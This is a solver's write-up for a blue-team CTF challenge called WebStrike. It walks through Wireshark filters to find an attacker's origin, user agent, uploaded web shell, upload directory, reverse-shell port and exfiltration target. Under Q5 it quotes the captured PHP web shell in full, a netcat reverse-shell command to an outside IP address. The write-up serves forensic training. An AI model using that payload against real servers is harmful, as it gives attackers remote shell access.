https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/

### Q1. Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?

<img width="1922" height="812" alt="image" src="https://github.com/user-attachments/assets/7081b037-8c66-4114-ba22-788e89a44295" />

`http.request.method == "GET"`

### Q2. Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?

<img width="1918" height="812" alt="image" src="https://github.com/user-attachments/assets/caeee91b-8b21-4d47-8dbd-b43afb572c4d" />

In the same packet as Q1, you can read the user agent.

### Q3. We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?

<img width="1917" height="811" alt="image" src="https://github.com/user-attachments/assets/8a3834ae-fec9-421c-9f81-64b8c54db5e1" />

You can read the malicious name in the same packet as Q1 and Q2.

### Q4. Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?

Same packet as Q1, Q2 and Q3.

### Q5. Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?

The traffic was filtered using `http.request.method == "POST"` After selecting a packet and navigating to Follow → HTTP Stream, a malicious PHP web shell was identified `<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 117.11.88.124 <PORT> > /tmp/f"); ?>`
This payload shows that the attacker used a POST request to execute a reverse shell and establish unauthorized outbound communication to the attacker's machine through the specified port.
<img width="1918" height="813" alt="image" src="https://github.com/user-attachments/assets/e5f4fd91-6b23-4a0f-8d27-5d98dde4b0b2" />

### Q6. Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

To determine the file the attacker attempted to exfiltrate, the traffic was filtered using `http.request.method == "POST" && ip.src == 24.49.63.79` After identifying the unique packet and inspecting its contents, the transmitted data revealed the file targeted by the attacker for exfiltration.
<img width="1920" height="812" alt="image" src="https://github.com/user-attachments/assets/fd5d88c7-2354-4c4f-bdfa-8d9902e59bba" />

